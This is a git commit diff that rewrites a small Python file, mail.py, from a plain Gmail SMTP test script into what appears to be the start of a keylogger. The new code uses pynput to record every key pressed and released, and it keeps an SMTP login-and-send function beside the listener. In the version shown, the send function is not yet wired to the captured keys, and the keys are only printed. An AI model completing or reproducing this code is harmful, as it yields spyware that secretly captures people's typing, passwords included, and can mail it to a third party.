4e1897e6efb95ffcb05fefa0c88a59ecb0f2661f
tgrahamcodes <tgraham@wpi.edu>
2020-04-09 20:16:16 -0400

    update

--- mail.py
+++ mail.py
@@ -1,15 +1,38 @@
+#!/usr/bin/env python3
 import smtplib
+from pynput import keyboard
+import time
 
-smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
-smtpServer.ehlo()
-smtpServer.starttls()
+keys = []
+keys2 = []
 
-smtpServer.login('@gmail.com', '')
 
-subject = 'Test'
-body = 'Test'
-msg = f'Subject: {subject}\n\n\n {body}'
+def on_press(key):
+    keys.append(format(key))
 
-smtpServer.sendmail('iamtomgraham@gmail.com', 'iamtomgraham@gmail.com', msg)
-print ('Sucessfully sent.')
-smtpServer.quit()
+
+def on_release(key):
+    keys2.append(format(key))
+
+def send():
+    smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
+    smtpServer.ehlo()
+    smtpServer.starttls()
+    smtpServer.login('@gmail.com', '')
+    subject = 'Test'
+    body = 'Test'
+    msg = f'Subject: {subject}\n\n\n {body}'
+    smtpServer.sendmail('@gmail.com', '@gmail.com', msg)
+    print('Sucessfully sent.')
+    smtpServer.quit()
+
+
+def main():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+    time.sleep(10)
+    print(keys)
+
+
+if __name__ == '__main__':
+    main()
